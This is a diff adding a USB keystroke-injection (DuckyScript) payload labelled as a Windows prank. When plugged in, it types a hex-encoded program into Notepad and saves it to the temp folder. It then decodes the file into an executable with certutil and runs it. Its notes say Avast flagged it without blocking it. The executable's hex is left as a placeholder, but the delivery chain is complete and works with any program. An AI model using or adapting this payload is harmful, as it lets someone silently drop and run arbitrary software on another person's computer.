@@ -1,0 +1,56 @@
+REM ##################################
+REM #                                |
+REM # Title        : Pranh(ex)       |
+REM # Author       : Aleff           |
+REM # Version      : 1.0             |
+REM # Category     : Prank           |
+REM # Target       : Windows 10/11   |
+REM #                                |
+REM ##################################
+
+
+Plug-And-Play <3
+
+
+REM Requirements:
+REM     - Nothing (i know, it's absurd)
+
+REM Note:
+REM     - For the creation of the executable, the hexadecimal code and in general to create this program I stuck to the payload: `Install And Run Any Arbitrary Executable - No Internet And Root Needed`
+REM     - Tested on Windows 11
+REM     - Running checked but not blocked by Avast antivirus
+REM     - Original Python code in assets/pranh(ex).py
+REM     - Hex content in assets/hexfile.txt
+REM     - exe file in assets/pranh(ex).exe
+
+REM Here you should put your HEX code
+DEFINE #HEX_CODE example
+
+
+GUI r
+DELAY 1000
+STRING notepad.exe
+ENTER
+DELAY 2000
+STRING #HEX_CODE
+DELAY 2000
+ALT F
+DELAY 1000
+STRING S
+DELAY 1000
+STRINGLN "%TEMP%\pranhex.hex"
+DELAY 1000
+ENTER
+DELAY 1000
+ALT F4
+DELAY 2000
+GUI r
+DELAY 500
+STRINGLN certutil -f -decodeHex "%TEMP%\pranhex.hex" "%TEMP%\pranhex.exe"
+DELAY 1000
+ENTER
+DELAY 1000
+GUI r
+DELAY 250
+STRINGLN "%TEMP%\pranhex.exe"
+ENTER
